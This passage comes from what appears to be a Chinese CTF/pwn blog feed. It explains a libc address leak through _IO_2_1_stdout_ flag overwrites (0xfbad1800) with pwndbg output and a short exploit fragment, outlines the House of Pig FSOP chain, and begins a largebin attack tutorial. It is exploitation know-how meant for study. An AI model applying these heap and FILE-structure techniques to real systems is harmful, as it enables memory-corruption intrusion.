<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x7ffff7dd26a3</span><br><span class="line">0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt;:   0xdd3780000000000a      0xffffff00007ffff7</span><br><span class="line">0x7ffff7dd26b3 &lt;_IO_2_1_stdout_+147&gt;:   0x000000ffffffffff      0xdd17a00000000000</span><br><span class="line">0x7ffff7dd26c3 &lt;_IO_2_1_stdout_+163&gt;:   0x00000000007ffff7      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d3 &lt;_IO_2_1_stdout_+179&gt;:   0x0000000000000000      0xffffff0000000000</span><br><span class="line">0x7ffff7dd26e3 &lt;_IO_2_1_stdout_+195&gt;:   0x00000000000000ff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f3 &lt;_IO_2_1_stdout_+211&gt;:   0xdd06e00000000000      0xdd254000007ffff7</span><br><span class="line">0x7ffff7dd2703 &lt;stderr+3&gt;:      0xdd262000007ffff7      0xdd18e000007ffff7</span><br><span class="line">0x7ffff7dd2713 &lt;stdin+3&gt;:       0xa2db8000007ffff7      0x00000000007ffff7</span><br><span class="line">0x7ffff7dd2723 &lt;map+3&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2733 &lt;__printf_arginfo_table+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2743 &lt;buf+3&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2753 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2763 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2773 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2783 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2793 &lt;ttyname_buf+3&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>若我们通过低字节覆盖，将它低字节覆盖为<code>\x00</code>，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x7ffff7dd2600</span><br><span class="line">0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2610 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0#这里包含了libc中的值</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>它就会根据<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>来输出从&lt;_IO_2_1_stderr_+192&gt;到 &lt;_IO_2_1_stdout_+131&gt;中间的内容</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>所以我们要泄露地址，首先要将 <code>io_file</code> 的 <code>_IO_CURRENTLY_PUTTING</code> 置 1，<code>_IO_IS_APPENDING</code> 0x1000 置 1，以及 <code>_IO_NO_WRITES</code> 0x8 不要为 1，就可以进行地址泄露了，一般可以覆盖为 <code>0xfbad1800</code>，就可以泄露 <code>write_base</code> 和 <code>write_ptr</code> 之间的值，随便运行个程序，我们可以看到这里，可以看到 <code>write_base</code> 和 <code>write_ptr</code> 都是 <code>libc</code>。</p>
<p><strong>deepseek解释0xfbad1800:</strong></p>
<p>在 <code>_flags</code> 字段 <code>0xfbad1800</code> 中，<code>0x1000</code> 和 <code>0x8</code> 对应的二进制位如下：</p>
<ol>
<li><strong>标志位解析</strong>：</li>
</ol>
<ul>
<li><p><strong><code>_IO_IS_APPENDING</code>（0x1000）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>12 位</strong>（从 0 开始计数）。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x1000 = 0x1000</code>，说明该位被设置为 <strong>1</strong>。</li>
<li><strong>作用</strong>：表示文件流处于追加模式（<code>append</code>），允许写入时自动定位到文件末尾。</li>
</ul>
</li>
<li><p><strong><code>_IO_NO_WRITES</code>（0x8）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>3 位</strong>。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x8 = 0</code>，说明该位被设置为 <strong>0</strong>。</li>
<li><strong>作用</strong>：允许写入操作（若为 1 则禁止写入）。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong><code>0xfbad1800</code> 的二进制分解</strong>：</li>
</ol>
<p>将 <code>0xfbad1800</code> 转换为 32 位二进制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1111 1011 1010 1101 0001 1000 0000 0000</span><br><span class="line">                       ^            ^</span><br><span class="line">                       |           |</span><br><span class="line">                       |           +-- 第 3 位 (0x8)：0</span><br><span class="line">                       +-- 第 12 位 (0x1000)：1</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>其他关键标志</strong>：</li>
</ol>
<ul>
<li><p><strong><code>_IO_CURRENTLY_PUTTING</code>（0x800）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>11 位</strong>。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x800 = 0x800</code>，说明该位被设置为 <strong>1</strong>。</li>
<li><strong>作用</strong>：表示当前正在进行输出操作（<code>put</code>）。</li>
</ul>
</li>
<li><p><strong><code>_IO_MAGIC</code>（0xfbad0000）</strong>：</p>
<ul>
<li><strong>高 16 位</strong>：<code>0xfbad</code>，标识这是一个合法的 <code>FILE</code> 结构。</li>
</ul>
</li>
</ul>
<ol start="4">
<li><strong>总结</strong>：</li>
</ol>
<ul>
<li><strong><code>0xfbad1800</code> 的位设置</strong>：<ul>
<li><strong>第 12 位（0x1000）</strong>：1（允许追加模式）。</li>
<li><strong>第 3 位（0x8）</strong>：0（允许写入操作）。</li>
<li><strong>第 11 位（0x800）</strong>：1（正在写入）。</li>
</ul>
</li>
</ul>
<p>通过覆盖 <code>_flags</code> 为 <code>0xfbad1800</code>，可以满足以下条件：</p>
<ol>
<li>启用 <code>_IO_IS_APPENDING</code> 和 <code>_IO_CURRENTLY_PUTTING</code>。</li>
<li>禁用 <code>_IO_NO_WRITES</code>，从而允许地址泄露。</li>
</ol>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>随便找一个输出菜单有puts的堆题，直接gdb运行起来</p>
<p>第一步，通过<code>x/32gx &amp;_IO_2_1_stdout_</code>来查看 stdout 的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">0x7ffff7dd2700 &lt;stderr&gt;:        0x00007ffff7dd2540      0x00007ffff7dd2620</span><br><span class="line">0x7ffff7dd2710 &lt;stdin&gt;: 0x00007ffff7dd18e0      0x00007ffff7a2db80</span><br></pre></td></tr></table></figure>

<p>第二步，通过<code>p *(struct _IO_FILE_plus*)0x7ffff7dd2620</code>查看它的结构体信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三步，设置flag值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> *0x7ffff7dd2620 = 0xfbad1800</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br></pre></td></tr></table></figure>

<p>第四步，设置_IO_write_base低位为\x00</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> *0x7ffff7dd2640 = 0x7ffff7dd2600</span><br><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd2600      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br></pre></td></tr></table></figure>

<p>再看结构体：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$4</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72542208,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br></pre></td></tr></table></figure>

<p>最终，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">1</span><br><span class="line">����&amp;��&amp;��&amp;�&amp;��&amp;��&amp;��&amp;��&amp;����������size:  </span><br></pre></td></tr></table></figure>

<p>可以看到在size: 前面多了一些东西，若我们在gdb的debug模式下就可以看到输出的是什么了。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>可以参考largebin_attack中的starctf_2019_heap_master</p>
<p>在exp中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))<span class="comment">#这个接收 b&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))<span class="comment">#jie&#x27;sh</span></span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br></pre></td></tr></table></figure>

<p>实现了接收泄露出的<code>_IO_file_jumps</code>的libc地址，从而计算出libc_base</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>io</tag>
      </tags>
  </entry>
  <entry>
    <title>house of pig</title>
    <url>/2025/04/15/house_of_pig/</url>
    <content><![CDATA[<h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">exit-&gt;__run_exit_handlers-&gt;__IO_cleanup-&gt;__IO_flush_all_lockp-&gt;__IO_str_overflow</span><br><span class="line">-&gt;malloc-&gt;__memmove_avx_unaligned_erms(memcpy)-&gt;free</span><br></pre></td></tr></table></figure>

<p>通过非预期调用 <code>malloc</code>&#x2F;<code>memcpy</code>&#x2F;<code>free</code> 实现利用</p>
<h1 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h1><p>因为利用链是 FSOP 的刷新流，所以需要触发刷新流，调用 <code>__IO_flush_all_lockp</code> 主要有三个时机：</p>
<ol>
<li><code>libc</code> 执行 <code>abort</code> 函数时（内存错误）</li>
<li>程序显式调用 <code>exit</code> 函数时</li>
<li>程序从 <code>main</code> 函数返回时</li>
</ol>
<p>现在的比赛环境，有了很多新的 IO 利用链，house of pig 借非预期地调用 <code>malloc</code>、<code>memcpy</code>、<code>free</code>，仍然有一定的应用场景。</p>
<p>除了结合题目的应用场景外，House of pig 通用性上，通常用于显式 <code>exit</code> 的情况（或者存在于 <code>main</code> 函数返回的情况），可以仅用一次 <code>largebinattack</code> 实现攻击目标。</p>
<h1 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h1><p>house of pig 有很大通用性优势的，有好几种分支，主要区别在于着重利用的函数。</p>
<p> **方案一：**重点在执行 free，触发 <code>IO_list_all</code></p>
<p>如果是利用 <code>fastbin reverse</code> 方法就触发 <code>IO_list_all + 0x70</code>（<code>stderr</code> 的 chain 字段）</p>
<ol>
<li>堆块上放好 payload（我们要触发的函数地址）</li>
<li>可申请到的 bin 里放置或伪造 <code>free_hook - 0x10</code>（即要修改的位置）</li>
<li>伪造 IO 结构体，触发实现申请 <code>free_hook</code>，写入 payload</li>
<li>触发 free 实现利用</li>
</ol>
<p>**方案二：**重点在执行 memcpy，构造堆用，实现 largebinattack -&gt; 触发 <code>IO_list_all</code></p>
<ol>
<li>在堆块里放置好 payload</li>
<li>修改 <code>tcache_struct</code> 的值</li>
<li>以及构造 fake IO 链 (0x410 -&gt; 0x290 -&gt; 0x128 -&gt; 0x108) 触发 <code>tcache</code> 结构体，实现申请 <code>libc.memcpy.got</code>，修改为 <code>system</code>。</li>
<li><code>delete</code> 一个 0x410 的堆</li>
</ol>
<p>方案二的延伸可以实现不用在 bin 里伪造目标地址，直接触发 <code>tcache</code> 结构体实现任意地址申请，且整个方案只需要进行一次 <code>largebinattack</code> 即可，适用于可以刷新流的任何情况。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Largebin attack</title>
    <url>/2025/03/26/largebin_attack/</url>
    <content><![CDATA[<p>文章是在初次学习largebin_attack时写的，有不准确的地方还望指正，文章中所用的环境基本都是ubuntu16.04</p>
<h2 id="了解largebin"><a href="#了解largebin" class="headerlink" title="了解largebin"></a>了解largebin</h2><p>了解largebin，首先要了解largebin的结构，下面是glibc源码的一部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  -----------------------  Chunk representations -----------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看出来，largebin中的chunk比其他的bins中的就够多出来了一部分就是<code>fd_nextsize</code>和<code>bk_nextsize</code></p>
<p><strong>什么样的大小才属于largebin？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br></pre></td></tr></table></figure>

<p>这是glibc中的宏定义，可以计算出：</p>
<ul>
<li>在64位程序下：MIN_LARGE_SIZE &#x3D; 64*0x10 &#x3D; 0x400;</li>
<li>在32位程序下：MIN_LARGE_SIZE &#x3D; 64*0x8 &#x3D; 0x200;</li>
</ul>
<p>大于MIN_LARGE_SIZE的chunk为large bin。</p>
<p><strong>largebin是如何管理的呢？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br></pre></td></tr></table></figure>

<p>这是glibc2.23源码1500行处</p>
<p>我们知道，fastbin有一个index，然后对应大小的bin放到对应index的bins里，largebin也类似，当一个bin被放入largebin时，首先根据size计算其对应的index，我们将0x400带入<code> 48 + (0x400 &gt;&gt; 6) = 64</code>，0x400~0x430带入largebin_index(sz)宏函数中计算后都是64，继续计算的话可以发现<strong>largebin中是在一个范围内chunk都属于同一个bin或index</strong>，因此以此类推，我们可以得到如下分布图：</p>
<p><img data-src="/../images/image-20250327153800287.png" alt="image-20250327153800287"></p>
<p><strong>我们知道了large bin是靠桶来管理不同index的chunk，不同index的chunk之间没有联系，那么在同一个index桶里，chunk之间有什么联系吗？</strong></p>
<p>Fd_nextsize指向比自己小的chunk，fd_bknextsize指向比自己大的chunk，最后一个chunk的fd_nextsize指向最后一个chunk，形成了<strong>双向链表</strong>，如下图：</p>
<p><img data-src="/../images/image-20250327161114374.png" alt="image-20250327161114374"></p>
<p><strong>假如多个一样大小的chunk怎么管理？</strong></p>
<p><img data-src="/../images/image-20250327162735558.png" alt="image-20250327162735558"></p>
<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><p>这个目的是了解<strong>同index不同大小的chunk</strong>的关系，和与libc_arena的关系</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);<span class="comment">//0x400</span></span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x10</span>);<span class="comment">//0x410</span></span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x420</span> - <span class="number">0x10</span>);<span class="comment">//0x420</span></span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">free</span>(p2);</span><br><span 